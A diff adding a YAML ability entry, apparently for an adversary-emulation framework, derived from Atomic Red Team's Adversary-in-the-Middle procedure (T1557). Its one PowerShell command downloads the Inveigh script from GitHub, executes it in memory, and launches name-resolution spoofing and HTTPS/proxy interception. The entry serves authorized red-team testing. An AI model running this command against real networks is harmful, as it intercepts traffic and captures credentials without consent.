@@ -1,0 +1,15 @@
+- id: 22b1630b-3321-4e51-8153-99a2fcca70dc
+  name: Adversary-in-the-Middle
+  description: Ability for Adversary-in-the-Middle (ATT&CK T1557). Generated from
+    Atomic Red Team procedures; review and test safely before use.
+  tactic: collection
+  technique:
+    attack_id: T1557
+    name: Adversary-in-the-Middle
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"
+          -UseBasicParsing) Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS
+          Y -PROXY Y'
